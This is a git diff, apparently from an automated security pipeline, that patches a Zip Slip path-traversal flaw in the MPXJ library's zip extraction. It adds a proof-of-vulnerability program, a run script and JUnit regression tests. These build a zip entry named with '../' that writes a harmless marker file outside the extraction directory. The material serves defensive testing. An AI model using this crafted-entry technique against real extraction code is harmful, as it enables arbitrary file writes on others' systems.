@@ -1,0 +1,283 @@
+diff --git a/src/main/java/net/sf/mpxj/common/InputStreamHelper.java b/src/main/java/net/sf/mpxj/common/InputStreamHelper.java
+index 69e2518..fe6bbb4 100644
+--- a/src/main/java/net/sf/mpxj/common/InputStreamHelper.java
++++ b/src/main/java/net/sf/mpxj/common/InputStreamHelper.java
+@@ -124,6 +124,17 @@ public class InputStreamHelper
+          }
+ 
+          File file = new File(dir, entry.getName());
++
++         // Guard against Zip Slip (CWE-022): ensure the resolved entry path
++         // stays within the target extraction directory. Reject entries whose
++         // name (e.g. containing "../") would escape the directory.
++         String canonicalDir = dir.getCanonicalPath() + File.separator;
++         String canonicalFile = file.getCanonicalPath();
++         if (!canonicalFile.startsWith(canonicalDir))
++         {
++            throw new IOException("Zip entry is outside of the target directory: " + entry.getName());
++         }
++
+          if (entry.isDirectory())
+          {
+             FileHelper.mkdirsQuietly(file);
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..1e98e2f
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,87 @@
++/*
++ * Proof-of-Vulnerability: CWE-022 Zip Slip path traversal in
++ * net.sf.mpxj.common.InputStreamHelper.writeZipStreamToTempDir(InputStream).
++ *
++ * The vulnerable code builds the output file with
++ *     File file = new File(dir, entry.getName());
++ * without verifying the resolved path stays inside `dir`. A crafted zip entry
++ * whose name contains "../" therefore writes a file OUTSIDE the temporary
++ * extraction directory.
++ *
++ * This POV exercises the real project method (no simulation) and:
++ *   - exits 0 when the traversal succeeds (unpatched / vulnerable code)
++ *   - exits non-zero when the traversal is blocked (correctly patched code)
++ */
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import net.sf.mpxj.common.InputStreamHelper;
++
++public class ZipSlipPov
++{
++   public static void main(String[] args) throws Exception
++   {
++      String marker = "mpxj_zipslip_pov_" + System.nanoTime() + ".txt";
++      // Single "../" escapes the extraction temp dir into its parent directory.
++      String maliciousEntryName = "../" + marker;
++      byte[] payload = "OWNED-BY-ZIP-SLIP-POV".getBytes("UTF-8");
++
++      // Build a real zip stream containing the traversal entry.
++      ByteArrayOutputStream baos = new ByteArrayOutputStream();
++      ZipOutputStream zos = new ZipOutputStream(baos);
++      ZipEntry entry = new ZipEntry(maliciousEntryName);
++      zos.putNextEntry(entry);
++      zos.write(payload);
++      zos.closeEntry();
++      zos.close();
++
++      File extractedDir = null;
++      File escapedFile = null;
++      try
++      {
++         // Drive the actual vulnerable project code.
++         extractedDir = InputStreamHelper.writeZipStreamToTempDir(
++               new ByteArrayInputStream(baos.toByteArray()));
++
++         File parent = extractedDir.getCanonicalFile().getParentFile();
++         escapedFile = new File(parent, marker);
++
++         boolean escaped =
++               escapedFile.exists()
++               && !escapedFile.getCanonicalPath()
++                     .startsWith(extractedDir.getCanonicalPath() + File.separator);
++
++         if (escaped)
++         {
++            System.out.println("[VULNERABLE] Zip Slip succeeded.");
++            System.out.println("  Extraction dir : " + extractedDir.getCanonicalPath());
++            System.out.println("  Escaped file   : " + escapedFile.getCanonicalPath());
++            System.exit(0);
++         }
++
++         System.out.println("[NOT VULNERABLE] Malicious entry did not escape the extraction dir.");
++         System.exit(1);
++      }
++      catch (Exception ex)
++      {
++         // A correct patch rejects the traversal entry (e.g. throws) -> not exploited.
++         System.out.println("[NOT VULNERABLE] Extraction rejected the traversal entry: " + ex);
++         System.exit(1);
++      }
++      finally
++      {
++         if (escapedFile != null && escapedFile.exists())
++         {
++            escapedFile.delete();
++         }
++         if (extractedDir != null)
++         {
++            net.sf.mpxj.common.FileHelper.deleteQuietly(extractedDir);
++         }
++      }
++   }
++}
+diff --git a/.security-pipeline/pov/classes/ZipSlipPov.class b/.security-pipeline/pov/classes/ZipSlipPov.class
+new file mode 100644
+index 0000000..b821832
+Binary files /dev/null and b/.security-pipeline/pov/classes/ZipSlipPov.class differ
+diff --git a/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class b/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class
+new file mode 100644
+index 0000000..15077b4
+Binary files /dev/null and b/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class differ
+diff --git a/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class b/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class
+new file mode 100644
+index 0000000..460997e
+Binary files /dev/null and b/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..dffa9ac
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,18 @@
++#!/usr/bin/env bash
++# Compile the real project classes involved in the vulnerability together with
++# the POV, then run the POV. Exits 0 only when the Zip Slip traversal succeeds.
++set -euo pipefail
++
++REPO="/workspace/repo"
++POV_DIR="${REPO}/.security-pipeline/pov"
++OUT="${POV_DIR}/classes"
++
++rm -rf "${OUT}"
++mkdir -p "${OUT}"
++
++javac -d "${OUT}" \
++  "${REPO}/src/main/java/net/sf/mpxj/common/FileHelper.java" \
++  "${REPO}/src/main/java/net/sf/mpxj/common/InputStreamHelper.java" \
++  "${POV_DIR}/ZipSlipPov.java"
++
++java -cp "${OUT}" ZipSlipPov
+diff --git a/src/test/java/net/sf/mpxj/junit/InputStreamHelperTest.java b/src/test/java/net/sf/mpxj/junit/InputStreamHelperTest.java
+new file mode 100644
+index 0000000..8ccf6ff
+--- /dev/null
++++ b/src/test/java/net/sf/mpxj/junit/InputStreamHelperTest.java
+@@ -0,0 +1,126 @@
++/*
++ * file:       InputStreamHelperTest.java
++ * author:     Security Pipeline
++ * copyright:  (c) Packwood Software 2026
++ * date:       15/07/2026
++ */
++
++/*
++ * This library is free software; you can redistribute it and/or modify it
++ * under the terms of the GNU Lesser General Public License as published by the
++ * Free Software Foundation; either version 2.1 of the License, or (at your
++ * option) any later version.
++ *
++ * This library is distributed in the hope that it will be useful, but
++ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
++ * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public
++ * License for more details.
++ *
++ * You should have received a copy of the GNU Lesser General Public License
++ * along with this library; if not, write to the Free Software Foundation, Inc.,
++ * 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.
++ */
++
++package net.sf.mpxj.junit;
++
++import static org.junit.Assert.*;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.io.IOException;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import net.sf.mpxj.common.FileHelper;
++import net.sf.mpxj.common.InputStreamHelper;
++
++import org.junit.Test;
++
++/**
++ * Tests to exercise InputStreamHelper, in particular protection against
++ * Zip Slip (CWE-022) path traversal when extracting zip streams.
++ */
++public class InputStreamHelperTest
++{
++   /**
++    * Ensure a zip entry whose name attempts to traverse outside of the
++    * extraction directory is rejected and does not write a file to the
++    * parent directory.
++    */
++   @Test public void testZipSlipEntryRejected() throws Exception
++   {
++      byte[] zipBytes = createZip("../mpxj_zipslip_regression.txt", "malicious");
++
++      File dir = null;
++      File escaped = null;
++      try
++      {
++         try
++         {
++            dir = InputStreamHelper.writeZipStreamToTempDir(new ByteArrayInputStream(zipBytes));
++         }
++
++         catch (IOException ex)
++         {
++            // Rejecting the traversal entry with an exception is acceptable.
++         }
++
++         // The malicious entry must never be written outside the extraction dir.
++         File tempRoot = File.createTempFile("mpxj", "probe").getParentFile();
++         escaped = new File(tempRoot, "mpxj_zipslip_regression.txt");
++         assertFalse("Zip Slip entry escaped the extraction directory", escaped.exists());
++      }
++
++      finally
++      {
++         if (dir != null)
++         {
++            FileHelper.deleteQuietly(dir);
++         }
++         if (escaped != null && escaped.exists())
++         {
++            FileHelper.deleteQuietly(escaped);
++         }
++      }
++   }
++
++   /**
++    * Ensure a well-formed zip entry is still extracted correctly.
++    */
++   @Test public void testValidEntryExtracted() throws Exception
++   {
++      byte[] zipBytes = createZip("nested/data.txt", "hello");
++
++      File dir = InputStreamHelper.writeZipStreamToTempDir(new ByteArrayInputStream(zipBytes));
++      try
++      {
++         File extracted = new File(dir, "nested/data.txt");
++         assertTrue("Valid zip entry was not extracted", extracted.exists());
++      }
++
++      finally
++      {
++         FileHelper.deleteQuietly(dir);
++      }
++   }
++
++   /**
++    * Build an in-memory zip file containing a single entry.
++    *
++    * @param entryName name of the zip entry
++    * @param content entry content
++    * @return zip file bytes
++    */
++   private byte[] createZip(String entryName, String content) throws IOException
++   {
++      ByteArrayOutputStream baos = new ByteArrayOutputStream();
++      ZipOutputStream zos = new ZipOutputStream(baos);
++      ZipEntry entry = new ZipEntry(entryName);
++      zos.putNextEntry(entry);
++      zos.write(content.getBytes("UTF-8"));
++      zos.closeEntry();
++      zos.close();
++      return baos.toByteArray();
++   }
++}
